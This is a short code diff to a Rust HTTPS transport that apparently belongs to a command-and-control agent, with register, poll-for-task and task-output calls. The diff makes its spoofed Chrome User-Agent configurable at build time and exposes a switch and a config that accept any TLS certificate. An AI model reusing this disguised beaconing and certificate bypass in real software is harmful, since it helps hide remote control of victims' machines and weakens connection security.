@@ -6,9 +6,16 @@ use ureq::{Agent, AgentBuilder};
 use super::{Channel, ChannelError};
 use crate::task::{PollResponse, RegisterRequest, RegisterResponse, TaskOutputRequest};
 
-const USER_AGENT: &str =
+const DEFAULT_UA: &str =
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
      (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+
+fn user_agent() -> &'static str {
+    match option_env!("DM_UA") {
+        Some(ua) if !ua.is_empty() => ua,
+        _ => DEFAULT_UA,
+    }
+}
 
 const fn str_eq(a: &str, b: &str) -> bool {
     let (a, b) = (a.as_bytes(), b.as_bytes());
@@ -21,7 +28,7 @@ const fn str_eq(a: &str, b: &str) -> bool {
     true
 }
 
-const TLS_SKIP_VERIFY: bool = str_eq(env!("DM_TLS_SKIP_VERIFY"), "true");
+pub const TLS_SKIP_VERIFY: bool = str_eq(env!("DM_TLS_SKIP_VERIFY"), "true");
 
 pub struct HttpsChannel {
     host:  String,
@@ -32,7 +39,7 @@ pub struct HttpsChannel {
 impl HttpsChannel {
     pub fn new(host: &str, port: &str) -> Self {
         let mut builder = AgentBuilder::new()
-            .user_agent(USER_AGENT)
+            .user_agent(user_agent())
             .timeout_connect(std::time::Duration::from_secs(10))
             .timeout(std::time::Duration::from_secs(30));
 
@@ -127,7 +134,7 @@ impl Channel for HttpsChannel {
 // Dev-only: accept self-signed / any TLS certificate
 // ---------------------------------------------------------------------------
 
-fn danger_tls_config() -> rustls::ClientConfig {
+pub fn danger_tls_config() -> rustls::ClientConfig {
     use rustls::client::danger::{
         HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
     };
